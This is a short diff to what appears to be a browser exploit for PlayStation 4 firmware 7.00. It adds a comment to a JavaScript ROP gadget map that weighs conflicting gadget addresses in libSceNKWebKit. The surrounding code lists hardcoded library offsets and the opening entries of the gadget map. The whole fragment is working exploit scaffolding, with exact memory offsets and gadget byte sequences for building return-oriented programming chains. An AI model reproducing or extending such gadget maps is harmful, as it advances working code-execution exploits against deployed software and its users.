@@ -73,6 +73,26 @@ const OFFSET_lc_longjmp                        = 0x0005AF60;
 
 const OFFSET_WORKER_STACK_OFFSET         = 0x0007FB88;
 
+/* --- pop r9 / cmp: UNRESOLVED CONFLICT, adjudicated at runtime -------------
+ * The hand-verified profile for THIS SAME BINARY (same DT_RELA r_offsets, so
+ * the same build) records that libSceNKWebKit 7.00 contains no `pop r9 ; ret`
+ * at all -- 63 `41 59` bytes, not one followed by C3 -- and no
+ * `cmp [rcx], eax ; ret`, and supplies documented stand-ins:
+ *
+ *     const OFFSET_wk_r9_zero_only          = true;   // 0x010BF949:
+ *          //  xor r9d,r9d ; test r9,r9 ; setne al ; ret
+ *          //  sets r9 = 0 and consumes NO stack slot
+ *     const OFFSET_wk_cmp_operands_reversed = true;   // 0x035F9049:
+ *          //  cmp eax,[rcx] ; ret  -- ZF symmetric, so EQUAL is exact
+ *
+ * The regenerated map below instead claims a plain `pop r9` at 0x002773C6.
+ * Both cannot be true. rop.js honours the two flags again, and prepare() now
+ * reads the bytes at every gadget before use, so ONE run settles it:
+ *   - GADGET-OK          -> 0x002773C6 really is 41 59 C3, keep this map.
+ *   - GADGET-BAD pop r9  -> restore 0x010BF949 and uncomment the flag above.
+ * Do not guess: rop.js emits a stack slot for `pop r9`, and the stand-in does
+ * not consume one, so getting this backwards misaligns every 6-argument call
+ * (all of which are mmap) by exactly one qword. */
 let wk_gadgetmap = {
 	"ret": 0x00000042,
 	"pop rdi": 0x00031434,
